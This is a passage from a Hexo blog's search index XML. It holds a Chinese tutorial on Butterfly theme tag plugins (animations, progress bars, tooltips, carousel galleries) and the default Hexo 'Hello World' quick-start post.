%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-tiger<span class="emphasis">_yin,5 %&#125;&#123;% icon icon-tiger,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rabbit_</span>mao,1 %&#125;&#123;% icon icon-rabbit,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dragon<span class="emphasis">_chen,3 %&#125;&#123;% icon icon-dragon,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-snake_</span>si,5 %&#125;&#123;% icon icon-snake,6 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-horse<span class="emphasis">_wu %&#125;&#123;% icon icon-horse,2 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-goat_</span>wei,3 %&#125;&#123;% icon icon-goat,4 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-monkey<span class="emphasis">_shen,5 %&#125;&#123;% icon icon-monkey,6 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-rooster_</span>you %&#125;&#123;% icon icon-rooster,2 %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% icon icon-dog<span class="emphasis">_xu,3 %&#125;&#123;% icon icon-dog,4 %&#125;</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">&#123;% icon icon-boar_</span>hai,5 %&#125;&#123;% icon icon-boar,6 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="特效标签wow"><a href="#特效标签wow" class="headerlink" title="特效标签wow"></a>特效标签wow</h1><div class="note blue icon modern"><i class="note-icon fas fa-bullhorn"></i><p>特效标签的静态资源未添加在本帖的配置内容中（因为多为cdn配置），请移步相关教程完成相关配置：</p><div class="tag link"><a class="link-card" title="使用wowjs给博客添加动画效果" href="https://akilar.top/posts/abab51cf/"><div class="left"><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/Akilarlxh/Akilarlxh.github.io/img/siteicon/favicon.ico"/></div><div class="right"><p class="text">使用wowjs给博客添加动画效果</p><p class="url">https://akilar.top/posts/abab51cf/</p></div></a></div></div><div class="tabs" id="animate"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#animate-1">标签语法</button></li><li class="tab"><button type="button" data-href="#animate-2">参数配置</button></li><li class="tab active"><button type="button" data-href="#animate-3">样式预览</button></li><li class="tab"><button type="button" data-href="#animate-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="animate-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% wow [animete],[duration],[delay],[offset],[iteration] %&#125;</span><br><span class="line">内容</span><br><span class="line">&#123;% endwow %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="animate-2"><ol><li><code>animate</code>: 动画样式，效果详见<a href="https://animate.style/">animate.css参考文档</a></li><li><code>duration</code>: 选填项，动画持续时间，单位可以是<code>ms</code>也可以是<code>s</code>。例如<code>3s</code>，<code>700ms</code>。</li><li><code>delay</code>: 选填项，动画开始的延迟时间，单位可以是<code>ms</code>也可以是<code>s</code>。例如<code>3s</code>，<code>700ms</code>。</li><li><code>offset</code>: 选填项，开始动画的距离（相对浏览器底部）</li><li><code>iteration</code>: 选填项，动画重复的次数</li></ol><div class="note warning flat"><p>注意，后面四个虽然是选填项，但是当有跨位选填时，次序不能乱。详见示例。<br>支持嵌套其他外挂标签。</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="animate-3"><ol><li><code>flip</code>动画效果。 <div class='wow animate__flip' data-wow-duration='' data-wow-delay='' data-wow-offset=''  data-wow-iteration='' ><pre><code>&lt;div class=&quot;note green icon modern&quot;&gt;&lt;i class=&quot;note-icon fas fa-fan&quot;&gt;&lt;/i&gt;&lt;p&gt;&lt;code&gt;flip&lt;/code&gt;动画效果。&lt;/p&gt;</code></pre><p>&lt;/div&gt;</p></div></li><li><code>zoomIn</code>动画效果，持续<code>5s</code>，延时<code>5s</code>，离底部<code>100</code>距离时启动，重复<code>10</code>次。 <div class='wow animate__zoomIn' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset='100'  data-wow-iteration='10' ><pre><code>&lt;div class=&quot;note blue icon modern&quot;&gt;&lt;i class=&quot;note-icon fas fa-bullhorn&quot;&gt;&lt;/i&gt;&lt;p&gt;&lt;code&gt;zoomIn&lt;/code&gt;动画效果，持续&lt;code&gt;5s&lt;/code&gt;，延时&lt;code&gt;5s&lt;/code&gt;，离底部&lt;code&gt;100&lt;/code&gt;距离时启动，重复&lt;code&gt;10&lt;/code&gt;次&lt;/p&gt;</code></pre><p>&lt;/div&gt;</p></div></li><li><code>slideInRight</code>动画效果，持续<code>5s</code>，延时<code>5s</code>。 <div class='wow animate__slideInRight' data-wow-duration='5s' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='' ><pre><code>&lt;div class=&quot;note orange icon modern&quot;&gt;&lt;i class=&quot;note-icon fas fa-car&quot;&gt;&lt;/i&gt;&lt;p&gt;&lt;code&gt;slideInRight&lt;/code&gt;动画效果，持续&lt;code&gt;5s&lt;/code&gt;，延时&lt;code&gt;5s&lt;/code&gt;。&lt;/p&gt;</code></pre><p>&lt;/div&gt;</p></div></li><li><code>heartBeat</code>动画效果，延时<code>5s</code>，重复<code>10</code>次。 <div class='wow animate__heartBeat' data-wow-duration='' data-wow-delay='5s' data-wow-offset=''  data-wow-iteration='10' ><pre><code>&lt;div class=&quot;note red icon modern&quot;&gt;&lt;i class=&quot;note-icon fas fa-battery-half&quot;&gt;&lt;/i&gt;&lt;p&gt;&lt;code&gt;heartBeat&lt;/code&gt;动画效果，延时&lt;code&gt;5s&lt;/code&gt;，重复&lt;code&gt;10&lt;/code&gt;次。&lt;/p&gt;</code></pre><p>&lt;/div&gt;</p></div></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="animate-4"><ol><li><code>flip</code>动画效果。<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__flip %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note green &#x27;fas fa-fan&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`flip`动画效果。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure></li><li><code>zoomIn</code>动画效果，持续<code>5s</code>，延时<code>5s</code>，离底部<code>100</code>距离时启动，重复<code>10</code>次。<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__zoomIn,5s,5s,100,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note blue &#x27;fas fa-bullhorn&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`zoomIn`动画效果，持续`5s`，延时`5s`，离底部`100`距离时启动，重复`10`次</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure></li><li><code>slideInRight</code>动画效果，持续<code>5s</code>，延时<code>5s</code>。<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__slideInRight,5s,5s %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note orange &#x27;fas fa-car&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`slideInRight`动画效果，持续`5s`，延时`5s`。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure></li><li><code>heartBeat</code>动画效果，延时<code>5s</code>，重复<code>10</code>次。此处注意不用的参数位置要留空，用逗号间隔。<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% wow animate<span class="strong">__heartBeat,,5s,,10 %&#125;</span></span><br><span class="line"><span class="strong">&#123;% note red &#x27;fas fa-battery-half&#x27; modern%&#125;</span></span><br><span class="line"><span class="strong">`heartBeat`动画效果，延时`5s`，重复`10`次。</span></span><br><span class="line"><span class="strong">&#123;% endnote %&#125;</span></span><br><span class="line"><span class="strong">&#123;% endwow %&#125;</span></span><br></pre></td></tr></table></figure></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="进度条-progress"><a href="#进度条-progress" class="headerlink" title="进度条 progress"></a>进度条 progress</h1><div class="note info morden flat"><p>进度条标签参考<a href="https://rongbuqiu.com/jdt.html">沂佰孜猫-给HEXO文章添加彩色进度条</a>。<br>源样式提取自<a href="https://zwying0814.gitbook.io/cuteen/">Cuteen</a>主题。</p></div><div class="tabs" id="progress"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#progress-1">标签语法</button></li><li class="tab"><button type="button" data-href="#progress-2">参数配置</button></li><li class="tab active"><button type="button" data-href="#progress-3">样式预览</button></li><li class="tab"><button type="button" data-href="#progress-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="progress-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% progress [width] [color] [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="progress-2"><p><code>width</code>: 0到100的阿拉伯数字<br><code>color</code>: 颜色，取值有<span class='p red'>red</span>,<span class='p yellow'>yellow</span>,<span class='p green'>green</span>,<span class='p cyan'>cyan</span>,<span class='p blue'>blue</span>,<span class='p gray'>gray</span><br><code>text</code>:进度条上的文字内容</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="progress-3"><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-red"  style="width: 10%" aria-valuenow="10" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-yellow"  style="width: 30%" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-green"  style="width: 50%" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-cyan"  style="width: 70%" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 90%" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-gray"  style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"><p>进度条样式预览</p></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="progress-4"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% progress 10 red 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 30 yellow 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 50 green 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 70 cyan 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 90 blue 进度条样式预览 %&#125;</span><br><span class="line">&#123;% progress 100 gray 进度条样式预览 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="注释-notation"><a href="#注释-notation" class="headerlink" title="注释 notation"></a>注释 notation</h1><div class="tabs" id="notation"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#notation-1">标签语法</button></li><li class="tab"><button type="button" data-href="#notation-2">参数配置</button></li><li class="tab active"><button type="button" data-href="#notation-3">样式预览</button></li><li class="tab"><button type="button" data-href="#notation-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="notation-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% nota [label] , [text] %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="notation-2"><p><code>label</code>: 注释词汇<br><code>text</code>: 悬停显示的注解内容</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="notation-3"><p><span class='nota' data-nota='可以看到注解内容出现在顶栏'>把鼠标移动到我上面试试</span></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="notation-4"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% nota 把鼠标移动到我上面试试 ,可以看到注解内容出现在顶栏 %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="旋转相册-carousel"><a href="#旋转相册-carousel" class="headerlink" title="旋转相册 carousel"></a>旋转相册 carousel</h1><div class="tabs" id="notation"><ul class="nav-tabs"><li class="tab"><button type="button" data-href="#notation-1">标签语法</button></li><li class="tab"><button type="button" data-href="#notation-2">参数配置</button></li><li class="tab active"><button type="button" data-href="#notation-3">样式预览</button></li><li class="tab"><button type="button" data-href="#notation-4">示例源码</button></li></ul><div class="tab-contents"><div class="tab-item-content" id="notation-1"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% carousel [Id] , [name] %&#125;</span><br><span class="line">![](/img/1.jpg)</span><br><span class="line">![](/img/2.jpg)</span><br><span class="line">![](/img/3,jpg)</span><br><span class="line">&#123;% endcarousel %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="notation-2"><p><code>Id</code>: 相册唯一ID，用于监测相册鼠标动作。禁止使用中文。同一页内不得出现相同ID的carousel相册。<br><code>name</code>: 相册中间显示的内容，建议用英文单引号包裹</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content active" id="notation-3"><div class="note warning flat"><p><code>carousel</code>标签因为代码中有一段是对<code>markdown</code>插件编译好的<code>html</code>内容作了首尾<code>p标签</code>删除的替换动作，所以在和其他标签嵌套使用时会有<code>bug</code>。此处就发现与tab标签存在一点兼容性bug，会导致后续的选项无法显示。建议不要和其他外挂标签一起嵌套使用。<br>预览请看相册页面:<a href="https://akilar.top/gallery/Gundam/">哦咧哇Gundam</a><br>当前的初始化最佳效果为8~12张图片排版，若不在这个范围内的，虽然电脑端可以通过鼠标滚轮缩放，但是手机端没法使用滚轮，可能效果堪忧。可以通过修改<code>carousel-touch.js</code>开头的参数来调整。</p></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="notation-4"><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% carousel &#x27;SF&#x27;,&#x27;strike freedom&#x27; %&#125;</span><br><span class="line">![](https://cdn.jsdelivr.net/npm/akilar-candyassets/image/20200907110444226.png)</span><br><span class="line">![](https://cdn.jsdelivr.net/npm/akilar-candyassets/image/20200907110508327.png)</span><br><span class="line">![](https://cdn.jsdelivr.net/npm/akilar-candyassets/image/20200907110525753.png)</span><br><span class="line">![](https://cdn.jsdelivr.net/npm/akilar-candyassets/image/20200907110600751.png)</span><br><span class="line">![](https://cdn.jsdelivr.net/npm/akilar-candyassets/image/20200907110621554.png)</span><br><span class="line">![](https://cdn.jsdelivr.net/npm/akilar-candyassets/image/20200907110637459.png)</span><br><span class="line">![](https://cdn.jsdelivr.net/npm/akilar-candyassets/image/20200907110654150.png)</span><br><span class="line">![](https://cdn.jsdelivr.net/npm/akilar-candyassets/image/20200907110707916.png)</span><br><span class="line">![](https://cdn.jsdelivr.net/npm/akilar-candyassets/image/20200907110719787.png)</span><br><span class="line">![](https://cdn.jsdelivr.net/npm/akilar-candyassets/image/20200907110731118.png)</span><br><span class="line">&#123;% endcarousel %&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
      
      
        <tags>
            
            <tag> 🍡Akilarの糖果屋 </tag>
            
            <tag> 🦋Butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2021/01/20/hello-world/"/>
      <url>2021/01/20/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
